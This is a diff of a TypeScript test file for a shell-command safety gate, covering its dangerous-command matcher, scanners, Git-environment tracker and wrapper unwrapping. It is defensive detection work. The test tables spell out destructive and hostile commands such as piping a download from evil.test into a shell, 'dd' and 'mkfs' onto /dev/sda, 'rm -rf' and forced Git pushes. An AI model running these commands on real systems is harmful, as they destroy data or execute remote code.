@@ -17,368 +17,365 @@ import {
   isStandardCommandWrapper,
   unwrapTransparentWrapper,
 } from '@/gate/analyzer/transparent-wrappers';
-import { expectRecordedDigest } from '../../helpers/gate-differential';
-import { corpusCommands, fuzzShellSources } from '../../helpers/shell-inputs';
 
 /**
- * The four small middle-layer modules are recorded over the corpus commands, a seeded fuzz, and a
- * table per module that walks the branches it owns. The linear scanners and the raw-text matcher
- * also record the scan work they charge, so the input at which the caller's budget breaches is
- * pinned.
+ * The four small middle-layer modules, each stated over the branches it owns. The linear scanners
+ * and the raw-text matcher also state the scan work they charge, so the input at which the
+ * caller's budget breaches is pinned.
  */
 
-const DANGER_SCAN_KINDS = [
-  'rm',
-  'reset-hard',
-  'reset-merge',
-  'clean',
-  'checkout',
-  'push-force',
-  'push-refspec',
-  'push-delete',
-  'branch',
-  'tag',
-  'restore',
-  'find',
-] as const;
+/** The destructive pattern the raw-text matcher named, or null when it found none. */
+function labelOf(text: string): string | null {
+  const match = dangerousInTextMatch(text);
+  if (!match) return null;
+  expect(match.id, text).toBe('raw-text.dangerous-command');
+  return /\(([^)]+)\)/.exec(match.reason)?.[1] ?? null;
+}
 
-const INTERPRETER_SCAN_KINDS = ['rm', 'dd', 'find'] as const;
+describe('the raw-text matcher', () => {
+  test('a destructive pattern in unparseable text is named', () => {
+    const rows: readonly { readonly text: string; readonly label: string | null }[] = [
+      { text: 'rm -rf /tmp/build', label: 'rm -rf' },
+      { text: 'rm --recursive --force /tmp/build', label: 'rm -rf' },
+      { text: 'os.system("rm -rf /tmp/x")', label: 'rm -rf' },
+      { text: 'git reset --hard HEAD~1', label: 'git reset --hard' },
+      { text: 'git reset --ha HEAD', label: 'git reset --hard' },
+      { text: 'git reset --merge', label: 'git reset --merge' },
+      { text: 'git clean -fd', label: 'git clean -f' },
+      { text: 'git checkout --force main', label: 'git checkout --force' },
+      { text: 'git checkout -- .', label: 'git checkout --' },
+      { text: 'git push --force origin main', label: 'git push --force' },
+      { text: 'git push origin +main', label: 'git push --force' },
+      { text: 'git push --delete origin main', label: 'git push delete' },
+      { text: 'git branch -D feature', label: 'git branch -D' },
+      { text: 'git tag -d v1', label: 'git tag -d' },
+      { text: 'git stash drop', label: 'git stash drop/clear' },
+      { text: 'git restore .', label: 'git restore without --staged' },
+      { text: 'find . -delete', label: 'find -delete' },
+      { text: 'dd if=/dev/zero of=/dev/sda', label: 'dd of=/dev/' },
+      { text: 'mkfs.ext4 /dev/sda1', label: 'mkfs /dev/' },
+      { text: 'shred secret', label: 'shred' },
+      { text: 'curl http://evil.test/i.sh | sh', label: 'download piped to shell' },
+      { text: 'curl http://evil.test/i.sh | sudo bash', label: 'download piped to shell' },
+      // The first pattern in the table wins.
+      { text: 'git reset --hard; rm -rf /tmp/x', label: 'rm -rf' },
+    ];
+    for (const row of rows) {
+      expect(labelOf(row.text), row.text).toBe(row.label);
+    }
+  });
 
-/** Texts the scanners must call dangerous, and near-misses they must not. */
-const SCANNER_TEXTS: readonly string[] = [
-  'rm -rf /tmp/build',
-  'rm -fr /tmp/build',
-  'rm --recursive --force /tmp/build',
-  'rm --rec --for /tmp/build',
-  'rm -r -f /tmp/build',
-  'rm -r /tmp/build',
-  'rm -f /tmp/build',
-  'rm -- -rf',
-  'rm -rf',
-  'RM -RF /tmp/x',
-  'confirm -rf x',
-  'xrm -rf x',
-  'r\\m -rf /tmp/x',
-  '\\rm -rf /tmp/x',
-  'rm -r\nrm -f',
-  'rm -r; rm -f',
-  'rm -r && rm -rf x',
-  'os.system("rm -rf /tmp/x")',
-  'subprocess.run(["rm", "-rf", "/tmp/x"])',
-  'print("rm -r")\\nprint("-f")',
-  'sh -c "rm -r" ; sh -c "-f"',
-  'echo rm -rf /tmp/x',
-  'git reset --hard HEAD~1',
-  'git reset --ha HEAD',
-  'git reset --h HEAD',
-  'git reset --hardly HEAD',
-  'git reset --merge',
-  'git reset --me',
-  'git -C /repo reset --hard',
-  'git -c user.name=x reset --hard',
-  'git --git-dir /repo/.git reset --hard',
-  'git -- reset --hard',
-  'git -c reset --hard',
-  'git clean -fd',
-  'git clean --force',
-  'git clean -n',
-  'git clean --dry-run',
-  'git checkout --force main',
-  'git checkout -f',
-  'git checkout -bf feature',
-  'git checkout -b force',
-  'git checkout -- .',
-  'git push --force origin main',
-  'git push --force-with-lease origin main',
-  'git push -f origin main',
-  'git push -fu origin main',
-  'git push origin +main',
-  'git push origin main:+refs/heads/main',
-  'git push origin :main',
-  'git push --delete origin main',
-  'git push --de origin main',
-  'git branch -D feature',
-  'git branch -d feature',
-  'git branch -df feature',
-  'git branch --delete --force feature',
-  'git branch -d -f feature',
-  'git tag -d v1',
-  'git tag --delete v1',
-  'git tag -l',
-  'git restore .',
-  'git restore --staged .',
-  'git restore --help',
-  'find . -name "*.log" -delete',
-  'find . -delete',
-  'find . -deleted',
-  'find . -name x\nrm -rf y',
-  'dd if=/dev/zero of=/dev/sda',
-  'dd of=/dev/sda',
-  'dd of=/dev/',
-  'dd of="/dev/sda"',
-  'echo dd of=/dev/sda',
-  '$(git reset --hard)',
-  'echo "$(git clean -f)"',
-  'git\treset\t--hard',
-  '',
-  ' ',
-  'git',
-  'git reset',
-];
+  test('a near miss, a display command and an empty text name nothing', () => {
+    const rows: readonly string[] = [
+      '',
+      ' ',
+      'git',
+      'git reset',
+      'xrm -rf x',
+      'confirm -rf x',
+      'rm -r /tmp/build',
+      'rm -f /tmp/build',
+      'rm -r; rm -f',
+      'git reset --h HEAD',
+      'git clean -n',
+      'git branch -d feature',
+      'git restore --staged .',
+      'git push --force-with-lease origin main',
+      'find . -deleted',
+      'dd of=/dev/',
+      'curl http://api.test | jq .',
+      // `echo` and `rg` only show the text, so the patterns that can only run are skipped.
+      'echo dd of=/dev/sda',
+      'rg "find . -delete" .',
+    ];
+    for (const text of rows) {
+      expect(labelOf(text), text).toBeNull();
+    }
+  });
 
-/** Segments the shell Git-context tracker walks, each a token list of one command. */
-const GIT_ENV_SEGMENTS: readonly (readonly string[])[] = [
-  ['git', 'status'],
-  ['GIT_DIR=/repo/.git', 'git', 'status'],
-  ['GIT_DIR=/repo/.git'],
-  ['GIT_WORK_TREE=/repo'],
-  ['GIT_CONFIG_GLOBAL=/tmp/gc'],
-  ['GIT_CONFIG_COUNT=2'],
-  ['GIT_SSH_COMMAND=ssh -o X'],
-  ['GIT_SSH=/usr/bin/ssh'],
-  ['TMPDIR=/var/tmp'],
-  ['IFS=:'],
-  ['IFS='],
-  ['TMPDIR+=/extra'],
-  ['GIT_SSH_COMMAND+= -v'],
-  ['PATH+=:/opt/bin'],
-  ['UNRELATED=1'],
-  ['UNRELATED=1', 'git', 'status'],
-  ['git', 'status', 'GIT_DIR=/repo/.git'],
-  ['echo', 'TMPDIR=/x'],
-  ['export', 'GIT_DIR'],
-  ['export', 'TMPDIR'],
-  ['export', 'UNRELATED'],
-  ['export', 'GIT_DIR=/repo/.git'],
-  ['typeset', 'GIT_SSH'],
-  ['declare', 'IFS'],
-  ['readonly', 'TMPDIR'],
-  ['builtin', 'export', 'GIT_DIR'],
-  ['command', 'export', 'TMPDIR'],
-  ['command', '-v', 'export', 'GIT_DIR'],
-  ['command', '-p', 'export', 'GIT_DIR'],
-  ['time', 'export', 'TMPDIR'],
-  ['unset', 'GIT_DIR'],
-  ['unset', 'TMPDIR'],
-  ['unset', 'IFS'],
-  ['unset', 'GIT_SSH_COMMAND'],
-  ['unset', 'UNRELATED'],
-  ['unset', '-v', 'GIT_DIR'],
-  ['unset', '--', 'GIT_DIR'],
-  ['unset', '-f', 'GIT_DIR'],
-  ['unset'],
-  ['unset', '1BAD'],
-  ['builtin', 'unset', 'TMPDIR'],
-  ['command', 'unset', 'GIT_DIR'],
-  ['command', '-vp', 'unset', 'GIT_DIR'],
-  ['GIT_DIR=/a', 'GIT_WORK_TREE=/b'],
-  ['GIT_DIR=/a', 'unset', 'GIT_DIR'],
-  ['1BAD=x', 'git', 'status'],
-  ['=x'],
-  [''],
-];
+  test('the matcher charges at least two passes over the text', () => {
+    const text = 'nothing dangerous here';
+    const work = { units: 0 };
+    expect(dangerousInTextMatch(text, work)).toBeNull();
+    expect(work.units).toBeGreaterThanOrEqual(text.length * 2);
+  });
+});
 
-const GIT_ENV_ENVIRONMENTS: readonly Readonly<Record<string, string>>[] = [
-  {},
-  { GIT_SSH_COMMAND: 'ssh -i /key', TMPDIR: '/tmp' },
-  { GIT_DIR: '/inherited/.git', IFS: ' ', GIT_SSH: '/usr/bin/ssh' },
-];
+describe('the linear scanners', () => {
+  test('each kind answers for the options its command spells, on one command', () => {
+    const rows: readonly {
+      readonly text: string;
+      readonly kind: Parameters<typeof hasLinearDangerousText>[1];
+      readonly dangerous: boolean;
+    }[] = [
+      { text: 'rm -rf /tmp/build', kind: 'rm', dangerous: true },
+      { text: 'rm -fr /tmp/build', kind: 'rm', dangerous: true },
+      { text: 'rm --rec --for /tmp/build', kind: 'rm', dangerous: true },
+      // Two commands do not combine into one dangerous one.
+      { text: 'rm -r; rm -f', kind: 'rm', dangerous: false },
+      { text: 'rm -r\nrm -f', kind: 'rm', dangerous: false },
+      { text: 'rm -- -rf', kind: 'rm', dangerous: false },
+      { text: 'git reset --hard', kind: 'reset-hard', dangerous: true },
+      { text: 'git -C /repo reset --hard', kind: 'reset-hard', dangerous: true },
+      { text: 'git reset --merge', kind: 'reset-hard', dangerous: false },
+      { text: 'git reset --merge', kind: 'reset-merge', dangerous: true },
+      { text: 'git clean -fd', kind: 'clean', dangerous: true },
+      { text: 'git clean -n', kind: 'clean', dangerous: false },
+      { text: 'git checkout -f', kind: 'checkout', dangerous: true },
+      { text: 'git checkout -b force', kind: 'checkout', dangerous: false },
+      { text: 'git push -f origin main', kind: 'push-force', dangerous: true },
+      { text: 'git push origin +main', kind: 'push-refspec', dangerous: true },
+      { text: 'git push --delete origin main', kind: 'push-delete', dangerous: true },
+      { text: 'git branch -D feature', kind: 'branch', dangerous: true },
+      { text: 'git branch -d feature', kind: 'branch', dangerous: false },
+      { text: 'git tag -d v1', kind: 'tag', dangerous: true },
+      { text: 'git restore .', kind: 'restore', dangerous: true },
+      { text: 'git restore --staged .', kind: 'restore', dangerous: false },
+      { text: 'find . -delete', kind: 'find', dangerous: true },
+      { text: 'find . -deleted', kind: 'find', dangerous: false },
+      { text: '', kind: 'rm', dangerous: false },
+      { text: ' ', kind: 'find', dangerous: false },
+    ];
+    for (const row of rows) {
+      expect(hasLinearDangerousText(row.text, row.kind), `${row.kind} ${row.text}`).toBe(
+        row.dangerous,
+      );
+    }
+  });
 
-const WRAPPER_TOKEN_ROWS: readonly (readonly string[])[] = [
-  ['doas', 'rm', '-rf', '/tmp/x'],
-  ['doas', '--', 'rm', '-rf', '/tmp/x'],
-  ['doas', '-u', 'root', 'rm', '-rf', '/tmp/x'],
-  ['doas', 'echo', 'rm', '-rf', '/tmp/x'],
-  ['doas', 'cat', 'file', 'rm'],
-  ['doas', 'doas', 'rm', '-rf', '/tmp/x'],
-  ['doas', 'git', 'clean', '-f'],
-  ['doas', '/usr/bin/git', 'clean', '-f'],
-  ['doas', 'busybox', 'rm', '-rf', '/tmp/x'],
-  ['doas', 'bash', '-c', 'rm -rf /tmp/x'],
-  ['doas', '$SHELL', '-c', 'rm -rf /tmp/x'],
-  ['doas', 'python3', '-c', 'import os'],
-  ['doas', 'gawk', 'BEGIN{system("id")}'],
-  ['doas', 'sudo', 'rm', '-rf', '/tmp/x'],
-  ['doas', 'env', 'rm', '-rf', '/tmp/x'],
-  ['doas', 'nice', 'rm', '-rf', '/tmp/x'],
-  ['doas', 'custom-tool', 'wipe'],
-  ['doas', '--', 'echo', 'rm'],
-  ['doas'],
-  ['doas', ''],
-  ['nice', 'rm', '-rf', '/tmp/x'],
-  ['nice', '-n', '10', 'rm', '-rf', '/tmp/x'],
-  ['rm', '-rf', '/tmp/x'],
-  ['sudo', 'rm', '-rf', '/tmp/x'],
-  ['', 'rm'],
-];
+  test('the interpreter variant reads a separator the shell scan stops on', () => {
+    const rows: readonly {
+      readonly text: string;
+      readonly kind: Parameters<typeof hasLinearInterpreterDanger>[1];
+      readonly interpreter: boolean;
+      readonly shell: boolean;
+    }[] = [
+      { text: 'rm -rf /tmp/x', kind: 'rm', interpreter: true, shell: true },
+      { text: 'dd if=/dev/zero of=/dev/sda', kind: 'dd', interpreter: true, shell: false },
+      { text: 'find . -delete', kind: 'find', interpreter: true, shell: true },
+      { text: 'find . ; -delete', kind: 'find', interpreter: true, shell: false },
+      { text: 'find . -print', kind: 'find', interpreter: false, shell: false },
+    ];
+    for (const row of rows) {
+      expect(hasLinearInterpreterDanger(row.text, row.kind), `${row.kind} ${row.text}`).toBe(
+        row.interpreter,
+      );
+      if (row.kind !== 'dd') {
+        expect(hasLinearDangerousText(row.text, row.kind), `shell ${row.kind} ${row.text}`).toBe(
+          row.shell,
+        );
+      }
+    }
+  });
 
-const WRAPPER_POLICIES: readonly Pick<EffectivePolicy, 'rules' | 'transparentWrappers'>[] = [
-  { rules: [], transparentWrappers: [] },
-  { rules: [], transparentWrappers: ['doas'] },
-  { rules: [], transparentWrappers: ['doas', 'nice'] },
-  {
-    rules: [
+  test('a scan charges linearly and stops early once it has an answer', () => {
+    const early = { units: 0 };
+    hasLinearDangerousText(`rm -rf ${'x'.repeat(512)}`, 'rm', early);
+    const late = { units: 0 };
+    hasLinearDangerousText(`${'x'.repeat(512)} rm -rf`, 'rm', late);
+    expect(early.units * 4).toBeLessThan(late.units);
+
+    const short = { units: 0 };
+    const text = 'rm x '.repeat(128);
+    expect(hasLinearDangerousText(text, 'rm', short)).toBeFalse();
+    expect(short.units).toBeGreaterThanOrEqual(text.length);
+    const long = { units: 0 };
+    hasLinearDangerousText('rm x '.repeat(256), 'rm', long);
+    expect(long.units).toBeLessThanOrEqual(short.units * 3);
+  });
+});
+
+describe('the shell Git-context tracker', () => {
+  const snapshot = (state: ShellGitContextEnvState) => ({
+    effective: [...(state.effectiveEnvAssignments ?? new Map())].sort(),
+    shell: [...state.shellAssignments].sort(),
+  });
+
+  test('the inherited environment seeds only the names Git reads', () => {
+    expect(snapshot(createShellGitContextEnvState(new Map())).effective).toStrictEqual([]);
+    expect(
+      snapshot(
+        createShellGitContextEnvState(
+          new Map([
+            ['GIT_SSH_COMMAND', 'ssh -i /key'],
+            ['TMPDIR', '/tmp'],
+            ['PATH', '/usr/bin'],
+          ]),
+        ),
+      ).effective,
+    ).toStrictEqual([
+      ['GIT_SSH_COMMAND', 'ssh -i /key'],
+      ['TMPDIR', '/tmp'],
+    ]);
+  });
+
+  test('a segment publishes the assignments that outlive it', () => {
+    const rows: readonly {
+      readonly tokens: readonly string[];
+      readonly env?: readonly (readonly [string, string])[];
+      readonly effective: readonly (readonly [string, string])[];
+    }[] = [
+      { tokens: ['git', 'status'], effective: [] },
+      // An assignment in front of a command is scoped to that command.
+      { tokens: ['GIT_DIR=/repo/.git', 'git', 'status'], effective: [] },
+      { tokens: ['GIT_DIR=/repo/.git'], effective: [['GIT_DIR', '/repo/.git']] },
+      { tokens: ['GIT_WORK_TREE=/repo'], effective: [['GIT_WORK_TREE', '/repo']] },
+      { tokens: ['UNRELATED=1'], effective: [['UNRELATED', '1']] },
+      { tokens: ['export', 'GIT_DIR=/repo/.git'], effective: [['GIT_DIR', '/repo/.git']] },
+      // The inherited value is already tracked, so exporting it changes nothing.
+      { tokens: ['export', 'TMPDIR'], env: [['TMPDIR', '/tmp']], effective: [] },
+      // A name Git never reads is not worth tracking through `export`.
+      { tokens: ['export', 'UNRELATED'], effective: [] },
       {
-        name: 'custom-tool-wipe',
-        command: 'custom-tool',
-        block_args: ['wipe'],
-        reason: 'custom-tool wipe destroys the workspace.',
+        tokens: ['builtin', 'export', 'GIT_DIR=/repo/.git'],
+        effective: [['GIT_DIR', '/repo/.git']],
       },
-    ],
-    transparentWrappers: ['doas'],
-  },
-];
-
-const WRAPPER_TOKENS: readonly string[] = [
-  'sudo',
-  'SUDO',
-  'env',
-  'command',
-  'builtin',
-  'doas',
-  'git',
-  'busybox',
-  '/usr/bin/env',
-  'python3.11',
-  'node',
-  'awk',
-  'bash',
-  'rm',
-  'xargs',
-  'parallel',
-  'find',
-  'echo',
-  '',
-];
-
-function scannerTexts(): readonly string[] {
-  return [...SCANNER_TEXTS, ...corpusCommands(), ...fuzzShellSources(400, 0x0051_c3a7)];
-}
-
-function snapshotState(state: ShellGitContextEnvState): readonly (readonly [string, string])[][] {
-  return [
-    [...(state.effectiveEnvAssignments ?? new Map())].sort(),
-    [...state.shellAssignments].sort(),
-  ];
-}
-
-describe('next/gate/analyzer middle layer versus src/analyzer', () => {
-  test('the linear scanners agree on every text and charge the same work', () => {
-    const recorded: [string, unknown][] = [];
-    let dangerous = 0;
-    /** One scanner over one text: the answer it gave, and the work it charged. */
-    const scanned = <Kind>(
-      text: string,
-      kind: Kind,
-      scan: (text: string, kind: Kind, work: { units: number }) => boolean,
-    ) => {
-      const work = { units: 0 };
-      const answer = scan(text, kind, work);
-      recorded.push([`${kind} ${text}`, { answer, units: work.units }]);
-      if (answer) dangerous++;
-    };
-    for (const text of scannerTexts()) {
-      for (const kind of DANGER_SCAN_KINDS) {
-        scanned(text, kind, hasLinearDangerousText);
-      }
-      for (const kind of INTERPRETER_SCAN_KINDS) {
-        scanned(text, kind, hasLinearInterpreterDanger);
-      }
+      // `command -v` asks about a command instead of running it.
+      { tokens: ['command', '-v', 'export', 'GIT_DIR'], effective: [] },
+      { tokens: ['unset', 'TMPDIR'], effective: [['TMPDIR', '']] },
+      { tokens: ['unset', '--', 'TMPDIR'], effective: [['TMPDIR', '']] },
+      // `unset -f` removes a function, not a variable.
+      { tokens: ['unset', '-f', 'TMPDIR'], effective: [] },
+      {
+        tokens: ['TMPDIR+=/extra'],
+        env: [['TMPDIR', '/tmp']],
+        effective: [['TMPDIR', '/tmp/extra']],
+      },
+      { tokens: ['1BAD=x'], effective: [] },
+      { tokens: [''], effective: [] },
+    ];
+    for (const row of rows) {
+      const state = createShellGitContextEnvState(new Map(row.env ?? []));
+      const before = snapshot(state).effective;
+      applyShellGitContextEnvSegment(row.tokens, state);
+      const after = snapshot(state).effective;
+      const changed = after.filter(
+        ([name, value]) => !before.some(([was, wasValue]) => was === name && wasValue === value),
+      );
+      expect(changed, row.tokens.join(' ')).toStrictEqual(
+        row.effective.map(([name, value]) => [name, value]),
+      );
     }
-    expect(dangerous).toBeGreaterThan(60);
-    expectRecordedDigest('analyzer-mid/linear-scanners', recorded);
   });
 
-  test('the linear scanners answer without a work counter too', () => {
-    const recorded: [string, unknown][] = [];
-    for (const text of SCANNER_TEXTS) {
-      for (const kind of DANGER_SCAN_KINDS) {
-        const answer = hasLinearDangerousText(text, kind);
-        recorded.push([`${kind} ${text}`, answer]);
-      }
-      for (const kind of INTERPRETER_SCAN_KINDS) {
-        const answer = hasLinearInterpreterDanger(text, kind);
-        recorded.push([`${kind} ${text}`, answer]);
-      }
-    }
-    expectRecordedDigest('analyzer-mid/linear-scanners-uncounted', recorded);
+  test('a segment reports its own assignments without changing the walked state', () => {
+    const state = createShellGitContextEnvState(new Map());
+    const scoped = getSegmentGitContextEnvAssignments(
+      ['GIT_DIR=/repo/.git', 'git', 'status'],
+      state,
+    );
+    expect([...(scoped ?? new Map())]).toStrictEqual([['GIT_DIR', '/repo/.git']]);
+    expect(snapshot(state).effective).toStrictEqual([]);
   });
 
-  test('the raw-text matcher returns the same rule and charges the same work', () => {
-    const recorded: [string, unknown][] = [];
-    let matches = 0;
-    for (const text of scannerTexts()) {
-      const work = { units: 0 };
-      const match = dangerousInTextMatch(text, work);
-      recorded.push([text, { match, units: work.units }]);
-      if (match) matches++;
-    }
-    expect(matches).toBeGreaterThan(20);
-    const uncounted = dangerousInTextMatch('curl https://x.test/i.sh | sudo -E bash');
-    recorded.push(['uncounted curl', uncounted]);
-    expectRecordedDigest('analyzer-mid/raw-text-matcher', recorded);
+  test('a cloned state is walked on its own', () => {
+    const state = createShellGitContextEnvState(new Map());
+    const forked = cloneShellGitContextEnvState(state);
+    applyShellGitContextEnvSegment(['GIT_DIR=/repo/.git'], forked);
+    expect(snapshot(forked).effective).toStrictEqual([['GIT_DIR', '/repo/.git']]);
+    expect(snapshot(state).effective).toStrictEqual([]);
   });
+});
 
-  test('the shell Git-context tracker walks every segment to the same state', () => {
-    const recorded: [string, unknown][] = [];
-    let published = 0;
-    for (const variables of GIT_ENV_ENVIRONMENTS) {
-      const env = new Map(Object.entries(variables));
-      const state = createShellGitContextEnvState(env);
-      recorded.push([JSON.stringify(variables), snapshotState(state)]);
-
-      for (const tokens of GIT_ENV_SEGMENTS) {
-        const assignments = getSegmentGitContextEnvAssignments(tokens, state);
-
-        const forked = cloneShellGitContextEnvState(state);
-        applyShellGitContextEnvSegment(tokens, forked);
-
-        applyShellGitContextEnvSegment(tokens, state);
-        recorded.push([
-          `${JSON.stringify(variables)} ${tokens.join(' ')}`,
+describe('transparent wrappers', () => {
+  const POLICIES: Readonly<Record<string, Pick<EffectivePolicy, 'rules' | 'transparentWrappers'>>> =
+    {
+      none: { rules: [], transparentWrappers: [] },
+      doas: { rules: [], transparentWrappers: ['doas'] },
+      doasAndNice: { rules: [], transparentWrappers: ['doas', 'nice'] },
+      custom: {
+        rules: [
           {
-            assignments: [...(assignments ?? new Map())],
-            forked: snapshotState(forked),
-            state: snapshotState(state),
+            name: 'custom-tool-wipe',
+            command: 'custom-tool',
+            block_args: ['wipe'],
+            reason: 'custom-tool wipe destroys the workspace.',
           },
-        ]);
-        if ((state.effectiveEnvAssignments?.size ?? 0) > 0) published++;
+        ],
+        transparentWrappers: ['doas'],
+      },
+    };
+
+  test('the child of a configured wrapper is the first protectable command after it', () => {
+    const rows: readonly {
+      readonly tokens: readonly string[];
+      readonly policy: keyof typeof POLICIES;
+      readonly childIndex: number | null;
+      readonly alternatives?: readonly number[];
+    }[] = [
+      // A wrapper the policy does not name is an ordinary command.
+      { tokens: ['doas', 'rm', '-rf', '/tmp/x'], policy: 'none', childIndex: null },
+      { tokens: ['doas', 'rm', '-rf', '/tmp/x'], policy: 'doas', childIndex: 1 },
+      { tokens: ['doas', '--', 'rm', '-rf', '/tmp/x'], policy: 'doas', childIndex: 2 },
+      { tokens: ['doas', '-u', 'root', 'rm', '-rf', '/tmp/x'], policy: 'doas', childIndex: 3 },
+      { tokens: ['doas', 'git', 'clean', '-f'], policy: 'doas', childIndex: 1 },
+      { tokens: ['doas', 'bash', '-c', 'rm -rf /tmp/x'], policy: 'doas', childIndex: 1 },
+      { tokens: ['doas', 'python3', '-c', 'import os'], policy: 'doas', childIndex: 1 },
+      // A standard wrapper after the configured one is itself protectable.
+      {
+        tokens: ['doas', 'sudo', 'rm', '-rf', '/tmp/x'],
+        policy: 'doas',
+        childIndex: 1,
+        alternatives: [2],
+      },
+      { tokens: ['doas', 'nice', 'rm', '-rf', '/tmp/x'], policy: 'doas', childIndex: 2 },
+      {
+        tokens: ['doas', 'nice', 'rm', '-rf', '/tmp/x'],
+        policy: 'doasAndNice',
+        childIndex: 1,
+        alternatives: [2],
+      },
+      // A display command carries nothing to protect, so the scan stops there.
+      { tokens: ['doas', 'echo', 'rm', '-rf', '/tmp/x'], policy: 'doas', childIndex: null },
+      { tokens: ['doas', '--', 'echo', 'rm'], policy: 'doas', childIndex: null },
+      { tokens: ['doas', 'custom-tool', 'wipe'], policy: 'doas', childIndex: null },
+      { tokens: ['doas', 'custom-tool', 'wipe'], policy: 'custom', childIndex: 1 },
+      { tokens: ['doas'], policy: 'doas', childIndex: null },
+      { tokens: ['doas', ''], policy: 'doas', childIndex: null },
+      { tokens: ['rm', '-rf', '/tmp/x'], policy: 'doas', childIndex: null },
+    ];
+    for (const row of rows) {
+      const label = `${row.policy}: ${row.tokens.join(' ')}`;
+      const policy = POLICIES[row.policy];
+      if (!policy) throw new Error(`missing policy ${row.policy}`);
+      const result = unwrapTransparentWrapper(row.tokens, policy);
+      expect(result?.childIndex ?? null, label).toBe(row.childIndex);
+      if (row.childIndex !== null) {
+        expect(result?.wrapper, label).toBe(row.tokens[0]);
+        expect(result?.alternativeChildIndices, label).toStrictEqual([...(row.alternatives ?? [])]);
       }
     }
-    expect(published).toBeGreaterThan(0);
-    expectRecordedDigest('analyzer-mid/git-context-tracker', recorded);
   });
 
-  test('the transparent-wrapper peel picks the same child under every policy', () => {
-    const recorded: [string, unknown][] = [];
-    let unwrapped = 0;
-    for (const policy of WRAPPER_POLICIES) {
-      for (const tokens of WRAPPER_TOKEN_ROWS) {
-        const result = unwrapTransparentWrapper(tokens, policy);
-        recorded.push([tokens.join(' '), result]);
-        if (result) unwrapped++;
-      }
-      for (const command of corpusCommands()) {
-        const tokens = command.split(/\s+/);
-        const result = unwrapTransparentWrapper(tokens, policy);
-        recorded.push([command, result]);
-      }
+  test('the standard wrappers and the reserved names are named apart', () => {
+    const rows: readonly {
+      readonly token: string;
+      readonly standard: boolean;
+      readonly reserved: boolean;
+    }[] = [
+      { token: 'sudo', standard: true, reserved: false },
+      { token: 'SUDO', standard: true, reserved: false },
+      { token: 'env', standard: true, reserved: false },
+      { token: 'command', standard: true, reserved: false },
+      { token: 'builtin', standard: true, reserved: false },
+      { token: 'doas', standard: false, reserved: false },
+      { token: 'echo', standard: false, reserved: false },
+      { token: '/usr/bin/env', standard: false, reserved: false },
+      { token: '', standard: false, reserved: false },
+      { token: 'git', standard: false, reserved: true },
+      { token: 'busybox', standard: false, reserved: true },
+      { token: 'rm', standard: false, reserved: true },
+      { token: 'xargs', standard: false, reserved: true },
+      { token: 'parallel', standard: false, reserved: true },
+      { token: 'find', standard: false, reserved: true },
+      { token: 'bash', standard: false, reserved: true },
+      { token: 'python3.11', standard: false, reserved: true },
+      { token: 'node', standard: false, reserved: true },
+      { token: 'awk', standard: false, reserved: true },
+    ];
+    for (const row of rows) {
+      expect(isStandardCommandWrapper(row.token), row.token).toBe(row.standard);
+      expect(isReservedTransparentWrapper(row.token), row.token).toBe(row.reserved);
     }
-    expect(unwrapped).toBeGreaterThan(10);
-    expectRecordedDigest('analyzer-mid/transparent-wrapper-peel', recorded);
-  });
-
-  test('the wrapper predicates answer as the shipped ones, reserved names included', () => {
-    const recorded: [string, unknown][] = [];
-    for (const token of WRAPPER_TOKENS) {
-      const standard = isStandardCommandWrapper(token);
-      // `isReservedTransparentWrapper` lives in core/policy: the gate keeps no copy of its own,
-      // so the core answer is the one pinned here.
-      const reserved = isReservedTransparentWrapper(token);
-      recorded.push([token, { standard, reserved }]);
-    }
-    expectRecordedDigest('analyzer-mid/wrapper-predicates', recorded);
-    expect(WRAPPER_TOKENS.filter(isStandardCommandWrapper).length).toBeGreaterThan(3);
-    expect(WRAPPER_TOKENS.filter(isReservedTransparentWrapper).length).toBeGreaterThan(6);
   });
 });
